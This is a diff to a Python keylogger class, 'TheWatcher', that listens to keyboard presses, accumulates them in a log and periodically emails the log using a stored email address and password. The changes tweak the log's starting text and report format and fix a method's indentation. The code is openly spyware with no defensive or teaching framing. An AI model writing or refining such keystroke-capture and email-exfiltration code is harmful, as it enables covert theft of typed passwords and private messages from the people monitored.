@@ -4,7 +4,7 @@ import threading
 
 class TheWatcher:
  def __init__(self, email_timer, email, passwd):
-  self.log = ""
+  self.log = "The Watcher has started :D"
   self.email_T = email_timer
   self.email = email
   self.passwd = passwd
@@ -33,13 +33,13 @@ class TheWatcher:
 
 # sending report to email 
  def report(self):
-  self.send_email(self.email, self.passwd, self.log)
+  self.send_email(self.email, self.passwd, "\n\n" + self.log)
   self.log = ""
   start_Timer = threading.Timer(self.email_T, self.report)
   start_Timer.start()
 
 # Starting listener
-def startWatcher(self):
+ def startWatcher(self):
   key_Listener = keyboard.Listener(on_press=self.callingBack)
   with key_Listener:
    self.report()
